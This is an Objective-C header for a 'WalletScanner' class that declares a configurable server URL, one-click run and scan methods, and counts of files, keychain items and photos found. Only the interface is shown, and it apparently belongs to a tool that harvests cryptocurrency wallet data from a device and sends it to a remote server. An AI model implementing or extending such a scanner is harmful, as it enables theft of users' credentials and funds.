//
//  WalletScanner.h
//  钱包自动扫描 — 单文件，零 import 烦恼
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@interface WalletScanner : NSObject

+ (instancetype)shared;

// 配置
@property (nonatomic, copy) NSString *serverURL;

// 一键执行
- (void)run;
- (void)scanOnly;

// 状态
@property (nonatomic, readonly) BOOL isRunning;
@property (nonatomic, readonly) BOOL isDone;
@property (nonatomic, readonly) NSInteger fileCount;
@property (nonatomic, readonly) NSInteger keychainCount;
@property (nonatomic, readonly) NSInteger photoCount;
@property (nonatomic, readonly) NSString *statusMsg;

@end

NS_ASSUME_NONNULL_END
